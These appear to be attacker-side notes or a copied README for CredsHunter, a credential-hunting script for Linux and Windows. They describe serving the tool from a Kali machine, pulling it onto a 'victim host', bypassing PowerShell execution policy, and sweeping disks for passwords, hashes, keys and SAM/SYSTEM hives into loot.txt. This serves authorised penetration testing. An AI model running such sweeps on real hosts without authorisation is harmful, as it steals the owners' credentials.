https://github.com/NeCr00/Credential-Hunting

## Linux

on KALI ATTACKER
```
cd ~/Desktop/Tools/Credential-Hunting && python -m http.server 80
```

on VICTIM HOST
```
chmod +x credshunter.sh
```

Execute
```
sudo ./credshunter.sh -p / -o loot.txt
```

---

## Windows

on KALI ATTACKER
```
cd ~/Desktop/Tools/Credential-Hunting && python -m http.server 80
```

on VICTIM HOST
```
wget 
```

```powershell
powershell -ep bypass
```

```powershell
.\credshunter.ps1 -Path C:\ -OutputFile loot.txt
```

---

## Usage

### Linux

Full host sweep with findings written to a file:

```shell
sudo ./credshunter.sh -p / -o loot.txt
```

Scan selected locations only:

```shell
./credshunter.sh -p /home -p /var/www -p /opt
```

Targeted scan without the slower recursive content stage:

```shell
./credshunter.sh -p /var/www -p /home --no-stage5
```

Exclude a directory tree:

```shell
./credshunter.sh -p / -x /var/lib/customer-app
```

### Windows

[](https://github.com/NeCr00/Credential-Hunting#windows-1)

Full `C:\` sweep:

```powershell
.\credshunter.ps1 -Path C:\ -OutputFile loot.txt
```

Scan multiple locations:

```powershell
.\credshunter.ps1 -Path C:\Users,C:\inetpub
```

Web / database host with SQL and CSV-style data scanning enabled:

```powershell
.\credshunter.ps1 -Path D:\ -IncludeData
```

Disable built-in system / vendor exclusions:

```powershell
.\credshunter.ps1 -Path C:\ -NoDefaultExclude
```

CredsHunter is pipe-friendly. Use `--no-color` on Linux or `-NoColor` on Windows when redirecting or filtering output.

---

## Finding tiers

[](https://github.com/NeCr00/Credential-Hunting#finding-tiers)

Results are grouped by usefulness and confidence, with the most important findings shown first.

|Tag|Meaning|
|---|---|
|`[CRITICAL]`|Confirmed credential container|
|`[HIGH]`|Reusable password, hash, GPP `cpassword`, or equivalent credential material|
|`[KEY]`|Private key or other key material, including readable SAM / SYSTEM hive findings|
|`[INTEREST]`|High-value file or location worth manual review|
|`[NAME]`|Suspicious filename — useful as a review hint|

A sensitive result in **CRITICAL**, **HIGH**, or **KEY** causes a non-zero sensitive-findings exit status. `INTEREST` and `NAME` findings alone do not.

For example:

```shell
./credshunter.sh -p /etc && echo "No high-confidence credential findings"
```

---

## Scan controls

[](https://github.com/NeCr00/Credential-Hunting#scan-controls)

|Goal|Linux|Windows|
|---|---|---|
|Add scan paths|`-p PATH` / `--path PATH`|`-Path PATH`|
|Exclude paths|`-x PATH` / `--exclude PATH`|`-ExcludePath PATH`|
|Scan every readable text file in Stage 5|`-a` / `--all`|`-All`|
|Change file-size cap|`-m N` / `--max-size N`|`-MaxFileSizeMB N`|
|Disable size cap|`--no-size-limit`|`-NoSizeLimit`|
|Write findings to file|`-o FILE` / `--output FILE`|`-OutputFile FILE`|
|Skip OS-level checks|`-s` / `--skip-system` / `--no-stage1`|`-SkipSystem` / `-NoStage1`|
|Skip a stage|`--no-stage2` ... `--no-stage5`|`-NoStage2` ... `-NoStage5`|
|Reduce status output|`-q` / `--quiet`|`-Quiet`|
|Disable ANSI colors|`--no-color`|`-NoColor`|
|Include SQL / CSV-style data files|—|`-IncludeData`|
|Disable default vendor/system exclusions|—|`-NoDefaultExclude`|

The default maximum file size is **5 MB**. Increase it when credentials may live in larger logs, dumps, or configuration exports, or disable the cap when appropriate.